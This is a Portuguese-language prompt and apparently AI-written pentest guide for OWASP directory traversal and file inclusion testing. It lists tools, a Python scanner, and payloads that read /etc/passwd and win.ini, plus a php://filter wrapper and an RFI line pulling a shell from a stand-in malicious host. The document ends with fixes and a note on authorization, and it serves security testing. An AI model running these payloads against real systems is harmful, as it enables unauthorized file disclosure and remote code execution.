### **PROMPT**
Você é um pentester. Você vai testar uma aplicação web e vai utilizar o Owasp Testing Guide como guia do seu teste. Quais ferramentas e como você as utilizaria para a fase que é a "Testing Directory Traversal File Include"

### **Descrição**
Na fase **"Testing Directory Traversal File Include"** do **OWASP Testing Guide**, o objetivo é identificar vulnerabilidades que permitam acessar ou incluir arquivos arbitrários no servidor. Essas falhas podem levar ao comprometimento de informações sensíveis, execução remota de código ou manipulação do comportamento da aplicação.

---

### **1. Objetivo do Teste**
- **Directory Traversal (Path Traversal):** Verificar se é possível acessar arquivos arbitrários no servidor (e.g., `/etc/passwd`).
- **File Inclusion:**
  - **Local File Inclusion (LFI):** Verificar se é possível incluir e executar arquivos locais no servidor.
  - **Remote File Inclusion (RFI):** Verificar se é possível incluir arquivos remotos, permitindo execução de código malicioso.

---

### **2. Ferramentas e Como Utilizá-las**

#### **A. Burp Suite**
- **Descrição:** Ferramenta para interceptar e manipular requisições HTTP.
- **Como usar:**
  1. **Interceptar Requisições:**
     - Identifique parâmetros vulneráveis (e.g., `file=`, `path=`, `page=`).
  2. **Manipular Parâmetros:**
     - Tente injetar payloads de **directory traversal**, como:
       ```plaintext
       ../../../../etc/passwd
       ..\..\..\..\boot.ini
       ```
  3. **Automação com Intruder:**
     - Use o **Intruder** para testar automaticamente diferentes payloads.
  4. **Ativar Função "Decoder":**
     - Teste variações codificadas, como `%2e%2e%2f` para `../`.

#### **B. OWASP ZAP**
- **Descrição:** Ferramenta para interceptar e analisar tráfego.
- **Como usar:**
  1. Utilize o módulo de **Fuzzing** para injetar payloads comuns de **directory traversal** e **file inclusion**.
  2. Configure proxies para capturar requisições feitas pela aplicação.

#### **C. wfuzz**
- **Descrição:** Ferramenta para automação de fuzzing em parâmetros HTTP.
- **Como usar:**
  - Execute fuzzing em busca de vulnerabilidades em parâmetros:
    ```bash
    wfuzz -c -z file,/path/to/payloads.txt --hc 404 "http://target.com/page?file=FUZZ"
    ```

#### **D. Nikto**
- **Descrição:** Ferramenta para identificar vulnerabilidades conhecidas.
- **Como usar:**
  - Execute varreduras automáticas para encontrar problemas de inclusão de arquivos:
    ```bash
    nikto -h http://target.com
    ```

#### **E. Metasploit**
- **Descrição:** Framework para exploração de vulnerabilidades.
- **Como usar:**
  - Use módulos específicos para explorar LFI e RFI:
    ```bash
    use auxiliary/scanner/http/http_lfi
    set RHOSTS target.com
    set RPORT 80
    run
    ```

#### **F. SecLists**
- **Descrição:** Coleção de payloads de segurança.
- **Como usar:**
  - Combine com ferramentas como Burp Suite ou wfuzz para injetar payloads em parâmetros vulneráveis:
    ```plaintext
    ../../../../etc/passwd
    ../../../../windows/system32/drivers/etc/hosts
    ../../../index.php
    ```

#### **G. cURL**
- **Descrição:** Ferramenta de linha de comando para envio de requisições HTTP.
- **Como usar:**
  - Envie payloads diretamente para o servidor:
    ```bash
    curl "http://target.com/page?file=../../../../etc/passwd"
    ```

#### **H. Python Scripts Personalizados**
- **Descrição:** Scripts para testar LFI/RFI de forma automatizada.
- **Como usar:**
  - Crie scripts para explorar parâmetros vulneráveis:
    ```python
    import requests

    url = "http://target.com/page"
    payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
    for payload in payloads:
        response = requests.get(url, params={"file": payload})
        if "root:" in response.text or "[extensions]" in response.text:
            print(f"Vulnerável: {payload}")
    ```

#### **I. Dirb ou Gobuster**
- **Descrição:** Ferramentas para brute force de diretórios e arquivos.
- **Como usar:**
  - Realize enumeração de diretórios e arquivos sensíveis.
    ```bash
    gobuster dir -u http://target.com -w /path/to/wordlist.txt
    ```

#### **J. Logger e Syslog Analysis**
- **Descrição:** Monitore logs do servidor para observar requisições suspeitas.
- **Como usar:**
  - Analise logs para detectar erros que indiquem vazamentos de arquivos.

---

### **3. Métodos de Teste**

#### **A. Identificação de Parâmetros Vulneráveis**
- Procure parâmetros que indiquem controle de diretórios ou arquivos (e.g., `file=`, `path=`, `template=`).
- Use ferramentas como Burp Suite e OWASP ZAP para identificar endpoints relevantes.

#### **B. Teste de Directory Traversal**
1. **Injeção de Payloads Simples:**
   - Tente acessar arquivos como `/etc/passwd` ou `boot.ini`:
     ```plaintext
     ../../../../etc/passwd
     ../../../../boot.ini
     ```
2. **Variações Codificadas:**
   - Teste versões URL-encoded e double-encoded:
     ```plaintext
     %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
     ```

#### **C. Teste de File Inclusion**
1. **Local File Inclusion (LFI):**
   - Insira arquivos do sistema local:
     ```plaintext
     /var/log/apache2/access.log
     ```
   - Utilize **PHP wrappers**:
     ```plaintext
     php://filter/convert.base64-encode/resource=../../../../etc/passwd
     ```

2. **Remote File Inclusion (RFI):**
   - Tente incluir arquivos hospedados externamente:
     ```plaintext
     http://malicious-site.com/shell.txt
     ```

#### **D. Manipulação de Respostas**
- Verifique as respostas HTTP para identificar vazamento de conteúdo, como logs ou credenciais.

#### **E. Automação de Fuzzing**
- Use ferramentas como wfuzz ou Intruder para testar vários payloads rapidamente.

#### **F. Análise de Logs**
- Analise logs do servidor para observar requisições que revelem falhas de inclusão.

---

### **4. Possíveis Vulnerabilidades Identificadas**
- **Acesso a arquivos sensíveis:**
  - `/etc/passwd`, `boot.ini`, ou configurações de aplicação.
- **Execução de código remoto (RFI):**
  - Inclusão de scripts externos maliciosos.
- **Exposição de arquivos de configuração:**
  - `config.php`, `settings.json`.
- **Exposição de logs:**
  - Arquivos como `access.log` ou `error.log`.

---

### **5. Recomendações de Correção**
1. **Validação de Entrada:**
   - Filtre e sanitize parâmetros para impedir manipulação de diretórios ou inclusão de arquivos.

2. **Restringir Caminhos de Arquivos:**
   - Use caminhos absolutos ou restrinja o acesso ao diretório base.

3. **Desabilitar Inclusão Remota:**
   - Desative `allow_url_include` e `allow_url_fopen` no PHP.

4. **Proteja Arquivos Sensíveis:**
   - Configure permissões para restringir o acesso a arquivos críticos.

5. **Registro e Monitoramento:**
   - Habilite logs para detectar tentativas de exploração.

---

### **6. Ética**
- **Permissão Prévia:** Obtenha autorização para conduzir testes.
- **Relatório:** Documente todas as vulnerabilidades com exemplos e recomendações claras para mitigação.

Seguindo esse guia, você pode identificar e explorar vulnerabilidades de **Directory Traversal** e **File Inclusion** de forma eficiente e ética.